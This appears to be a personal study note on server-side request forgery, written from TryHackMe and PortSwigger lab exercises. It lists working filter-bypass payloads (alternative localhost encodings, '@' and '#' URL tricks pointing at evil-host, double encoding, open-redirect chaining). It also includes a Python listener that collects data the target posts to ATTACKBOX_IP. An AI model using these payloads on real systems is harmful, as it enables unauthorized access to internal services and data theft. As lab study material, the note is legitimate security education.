
Server-side request forgery is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location.

# Types

## Basic SSRF
The goal is to use an intermediary server to access resources that you could not from your own machine and return them to you. This could be as simple as accessing something on the server's localhost rather than something on the intended page. Example:
- If you are given access to `http://hrms.thm/?url=localhost/copyright`
- Try `http://hrms.thm/?url=localhost/config`

Example 2: Inspect the source code

![](/assets/images/SSRF/Screenshot%202024-11-27%20at%203.30.29%20PM.png)

Here the `salary.php` page is being pulled from an internal server when we access it through the public server. If we can change what is being requested, we can access something we shouldn't. 
- Note: This was shown in the lab as being done in browser tools, but I had to do it in Burp. 

## Blind SSRF
We can send requests but can't see the responses. The example from task 5 seems highly specific, but it involves standing up a server and using it to write responses from the target by requesting `http://hrms.thm/profile.php?url=http://ATTACKBOX_IP:8080`

The code is as follows, but again, highly specific:
```python
from http.server import SimpleHTTPRequestHandler, HTTPServer
from urllib.parse import unquote
class CustomRequestHandler(SimpleHTTPRequestHandler):

    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')  # Allow requests from any origin
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Hello, GET request!')

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')

        self.send_response(200)
        self.end_headers()

        # Log the POST data to data.html
        with open('data.html', 'a') as file:
            file.write(post_data + '\n')
        response = f'THM, POST request! Received data: {post_data}'
        self.wfile.write(response.encode('utf-8'))

if __name__ == '__main__':
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, CustomRequestHandler)
    print('Server running on http://localhost:8080/')
    httpd.serve_forever()
```

## DDoS
Another example of SSRF involves requesting a resource that the server can't handle. In the example from Task 6, this is simply an image that is too large for an example function to parse, providing us with a flag. 

# Examples
## SSRF with blacklist-based input filters

Some applications block input containing hostnames like `127.0.0.1` and `localhost`, or sensitive URLs like `/admin`. In this situation, you can often circumvent the filter using the following techniques:
- Use an alternative IP representation of `127.0.0.1`, such as `2130706433`, `017700000001`, or `127.1`.
- Register your own domain name that resolves to `127.0.0.1`. You can use `spoofed.burpcollaborator.net` for this purpose.
- Obfuscate blocked strings using URL encoding or case variation.
- Provide a URL that you control, which redirects to the target URL. *Try using different redirect codes, as well as different protocols for the target URL*. For example, switching from an `http:` to `https:` URL during the redirect has been shown to bypass some anti-SSRF filters.

## Lab: SSRF with blacklist-based input filter
- Bypass the block by changing the URL to: `http://127.1/`
- Change the URL to `http://127.1/admin` and observe that the URL is blocked again.
- Obfuscate the "a" by double-URL encoding it to %2561 to access the admin interface and delete the target user.
	- *This gives you the view of the admin panel, and you can see from there the URLs to delete your user. Simply change it to carlos.*

## Whitelist-based input filters
- Embed credentials in a URL before the hostname, using the `@` character:
    `https://expected-host:fakepassword@evil-host`
- Use the `#` character to indicate a URL fragment:
    `https://evil-host#expected-host`
- You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control:
    `https://expected-host.evil-host`
- URL-encode characters to confuse the URL-parsing code. 
	- This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request. 
	- You can also try *double-encoding* characters; some servers recursively URL-decode the input they receive, which can lead to further discrepancies.
- Combinations of these techniques together.

## Open Redirection
`/product/nextProduct?currentProductId=6&path=http://evil-user.net` works
So the actual request is:
```
POST /product/stock HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118 

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```
- Application allows from the weliketoshop domain but then gets got


## Referer Header
In the "Blind SSRF with out-of-band detection" lab, the videos show a Referer Header, but the actual request doesn't seem to have one. I added one anyway, and was able to poll the Collaborator server. 
- **So sometimes try adding the `Referer` Header**
